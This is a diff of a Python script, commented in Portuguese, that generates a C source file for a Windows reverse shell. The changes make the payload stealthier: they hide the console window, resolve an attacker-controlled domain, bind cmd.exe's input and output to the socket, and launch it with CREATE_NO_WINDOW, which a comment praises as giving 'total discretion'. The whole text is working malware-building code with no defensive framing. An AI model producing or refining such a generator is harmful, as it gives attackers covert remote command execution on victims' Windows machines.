@@ -10,23 +10,26 @@ def gerar_reverse_shell(ip_destino, porta_destino):
 // Payload reverso (Windows) - template
 // Altere HOST e PORT conforme necessário
 #include <winsock2.h>
-#include <ws2tcpip.h>
 #include <windows.h>
 #include <stdio.h>
 
 #pragma comment(lib, "Ws2_32.lib")
 
-#define HOST "{IP}"  // altere aqui
-#define PORT "{PORT}"           // altere aqui
-
 int main() {
+    HWND stealth = GetConsoleWindow();
+    ShowWindow(stealth, SW_HIDE);
+
     WSADATA wsa;
     SOCKET s;
     struct sockaddr_in server;
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
+    struct hostent *host; // Estrutura para o DNS
 
-    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
+    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 1;
+
+    // 1. Resolve o domínio para IP
+    host = gethostbyname("{IP}");
+    if (host == NULL) {
+        WSACleanup();
         return 1;
     }
 
@@ -34,25 +37,36 @@ int main() {
     if (s == INVALID_SOCKET) return 1;
 
     server.sin_family = AF_INET;
-    server.sin_port = htons(atoi(PORT));
-    server.sin_addr.s_addr = inet_addr(HOST);
+    server.sin_port = htons({PORT});
+    // 2. Copia o IP resolvido para a estrutura do servidor
+    server.sin_addr.s_addr = *((unsigned long *)host->h_addr);
 
-    WSAConnect(s, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL);
+    if (WSAConnect(s, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) != SOCKET_ERROR) {
+        STARTUPINFO si;
+        PROCESS_INFORMATION pi;
+        ZeroMemory(&si, sizeof(si));
+        
+        si.cb = sizeof(si);
+        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
+        si.wShowWindow = SW_HIDE;
 
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
+        // CREATE_NO_WINDOW garante discrição total
+        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
 
-    TCHAR cmd[] = TEXT("cmd.exe");
-    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
-
+    closesocket(s);
+    WSACleanup();
     return 0;
 }
 """
     content = template.replace("{IP}", ip_destino).replace("{PORT}", str(porta_destino))
-    nome_arquivo_saida = f"payload_rev_shell_{ip_destino.replace('.', '_')}_{porta_destino}.c"
-    #nome_arquivo_ofuscado = f"payload_rev_shell_{ip_destino.replace('.', '_')}_{porta_destino}_ofuscado.c"
+    nome_arquivo_saida = f"payload.c"
 
     try:
         with open(nome_arquivo_saida, 'w', encoding='utf-8') as f:
